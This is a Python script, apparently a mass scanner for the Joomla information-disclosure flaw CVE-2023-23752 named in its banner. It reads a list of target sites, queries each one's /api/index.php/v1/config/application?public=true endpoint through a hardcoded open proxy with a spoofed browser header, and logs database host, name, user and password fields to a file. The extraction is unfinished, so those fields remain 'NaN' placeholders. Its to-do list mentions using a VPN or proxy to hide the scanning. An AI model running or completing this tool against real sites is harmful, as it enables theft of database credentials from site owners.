import requests
import time
import colorama
from colorama import Fore, Style

colorama.init(autoreset=True)

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36'
}

proxies = {
    'https': 'http://75.89.101.60:80'
}
# passProxies = {
#    'https': f'http://{login}:{password}@IP:port'
# }


host = 'NaN'
db = 'NaN'
user = 'NaN'
passw = 'NaN'

print('''

######   ##     ## ########          #######    #####    #######   #######           #######   #######  ######## ########  #######  
##    ## ##     ## ##               ##     ##  ##   ##  ##     ## ##     ##         ##     ## ##     ## ##    ## ##       ##     ## 
##       ##     ## ##                      ## ##     ##        ##        ##                ##        ##     ##   ##              ## 
##       ##     ## ######   #######  #######  ##     ##  #######   #######  #######  #######   #######     ##    #######   #######  
##        ##   ##  ##               ##        ##     ## ##               ##         ##               ##   ##           ## ##        
##    ##   ## ##   ##               ##         ##   ##  ##        ##     ##         ##        ##     ##   ##     ##    ## ##        
 ######     ###    ########         #########   #####   #########  #######          #########  #######    ##      ######  #########



 ''')


def request(url, retry=3):
    host = url
    try:

        if not url.startswith("http://") and not url.startswith("https://"):
            url = "http://" + url
        if not url.endswith("/api/index.php/v1/config/application?public=true"):
            url += "/api/index.php/v1/config/application?public=true"


        response = requests.get(url, headers=headers, proxies=proxies)
        output(response.status_code, url, host)
    except Exception as ex:
        time.sleep(3)
        if retry:
            print(Fore.YELLOW + Style.BRIGHT + "[INFO] " + Style.RESET_ALL + f"retry={retry} => {url}")
            return request(url, retry=(retry - 1))
        else:
            raise
    else:
        return response


def output(response, url, host):
    if response == 200:
        print(Fore.GREEN + Style.BRIGHT + '[+] ' + url + Fore.WHITE + Style.RESET_ALL + ' [' + str(response) + ']')
        print('\tHost:\t\t' + host + '\n\tDB name:\t' + db + '\n\tUsername:\t' + user + '\n\tPassword:\t' + passw)
        write(url, host, db, user, passw)
    elif response == 400:
        print(Fore.RED + Style.BRIGHT + '[-] ' + url + Fore.WHITE + Style.RESET_ALL + ' [' + str(response) + ']')
    else:
        print(Fore.MAGENTA + Style.BRIGHT + f'OPS... {host} is unreachable')


def write(url, host, db, user, passw):
    with open(file='output.txt', mode='a') as file:
        file.write(f'{url}\n[HOST]\t=> {host} \n[DB]\t=> {db} \n[User]\t=> {user} \n[Pass]\t=> {passw}\n\n')


def main():
    with open("targets.txt") as file:
        targets_urls = file.read().splitlines()

    for targets_urls in targets_urls:
        try:
            request(url=targets_urls)
        except Exception as ex:
            continue


if __name__ == '__main__':
    main()

# TO DO LIST ##
# use OpenVPN / proxy - completed (no VPN)
# add user-agent - completed
# create console menu - colorama + argparse + progress-bar???

# chek 'http(s)://' + completed